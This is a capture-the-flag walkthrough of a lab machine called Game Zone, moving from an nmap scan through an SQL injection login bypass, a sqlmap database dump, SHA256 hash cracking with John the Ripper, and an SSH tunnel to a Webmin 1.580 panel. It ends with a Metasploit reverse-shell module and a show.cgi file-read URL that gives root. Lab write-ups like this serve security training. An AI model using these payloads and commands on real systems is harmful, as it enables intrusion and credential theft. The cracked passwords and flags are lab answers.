### [searchreq.txt](./searchreq.txt)
### [hash.txt](./hash.txt)
### [sqlmap.dump.txt](./sqlmap.dump.txt)
### [db.dump.csv](./db.dump.csv)
### [user.dump.cvs](./user.dump.cvs)

## Task 1 Deploy the vulnerable machine

### nmap

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-30 02:07 EDT
Nmap scan report for 10.10.5.24
Host is up (0.087s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Game Zone
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.96 seconds

```

> What is the name of the large cartoon avatar holding a sniper on the forum?

agent 47

Google image search

## Task 2 Obtain access via SQLi

Use `' or 1=1 -- -` as your username and leave the password blank.

> When you've logged in, what page do you get redirected to?
portal.php

## Task 3 Using SQLMap

First we need to intercept a request made to the search feature using BurpSuite.

```
POST /portal.php HTTP/1.1
Host: 10.10.5.24
User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://10.10.5.24
Connection: close
Referer: http://10.10.5.24/portal.php
Cookie: PHPSESSID=1pejo9crsgju8gbupmea9ljb42
Upgrade-Insecure-Requests: 1

searchitem=sdfs
```

Save this request into a text file. We can then pass this into SQLMap to use our authenticated user session.

```
sqlmap -r request.txt --dbms=mysql --dump

# -r uses the intercepted request you saved earlier
# --dbms tells SQLMap what type of database management system it is
# --dump attempts to outputs the entire database
```

SQLMap will now try different methods and identify the one thats vulnerable. Eventually, it will output the database.


> In the users table, what is the hashed password?

ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

> What was the username associated with the hashed password?

agent47

> What was the other table name?

post

all in the sql dump files


## Task 4 Cracking a password with JohnTheRipper

Once you have JohnTheRipper installed you can run it against your hash using the following arguments:


```
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256

# hash.txt - contains a list of your hashes (in your case its just 1 hash)
# --wordlist - is the wordlist you're using to find the dehashed value
# --format - is the hashing algorithm used. In our case its hashed using SHA256.
```

```
└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 ASIMD 4x])
Warning: poor OpenMP scalability for this hash type, consider --fork=4
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (?)
1g 0:00:00:00 DONE (2021-09-30 02:44) 1.587g/s 13315Kp/s 13315Kc/s 13315KC/s 123456..ejrhz
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably
Session completed

```

> What is the de-hashed password?
videogamer124

Now you have a password and username. Try SSH'ing onto the machine.
`ssh agent47@10.10.5.24`

> What is the user flag?
```
agent47@gamezone:~$ cat user.txt
649ac17b1480ac13ef1e4fa579dac95c
```

## Task 5 Exposing services with reverse SSH tunnels

```
Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.

-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
```


```
We will use a tool called ss to investigate sockets running on a host.

If we run ss -tulpn it will tell us what socket connections are running
```

> How many TCP sockets are running?

5

```
agent47@gamezone:~$ ss -tulpn
Netid  State      Recv-Q Send-Q Local Address:Port               Peer Address:Port
udp    UNCONN     0      0        *:68                   *:*
udp    UNCONN     0      0        *:57753                *:*
udp    UNCONN     0      0        *:10000                *:*
tcp    LISTEN     0      80     127.0.0.1:3306                 *:*
tcp    LISTEN     0      128      *:10000                *:*
tcp    LISTEN     0      128      *:22                   *:*
tcp    LISTEN     0      128     :::80                  :::*
tcp    LISTEN     0      128     :::22                  :::*
```


From your local machine, run
```
$ ssh -L 10000:localhost:10000 agent47@<ip>
```
to connect to the webserver at port 10k, login as agent47

> What is the name of the exposed CMS?
webmin

> What is the CMS version?
1.580



## Task 6 Privilege Escalation with Metasploit

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

```
msf6 exploit(unix/webapp/webmin_show_cgi_exec) > options

Module options (exploit/unix/webapp/webmin_show_cgi_exec):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   PASSWORD  videogamer124    yes       Webmin Password
   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS    10.10.241.11     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT     10000            yes       The target port (TCP)
   SSL       true             yes       Use SSL
   USERNAME  agent 47         yes       Webmin Username
   VHOST                      no        HTTP server virtual host


Payload options (cmd/unix/reverse_python):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.8.240.61      yes       The listen address (an interface may be specified)
   LPORT  9001             yes       The listen port
   SHELL  /bin/bash        yes       The system shell to use.


Exploit target:

   Id  Name
   --  ----
   0   Webmin 1.580

```
according to the exploit https://www.americaninfosec.com/research/dossiers/AISG-12-001.pdf
the show.cgi file will let authenticated user to run any commands as root, like so:
`http://localhost:10000/file/show.cgi/root/root.txt`

> What is the root flag?

a4b945830144bdd71908d12d902adeee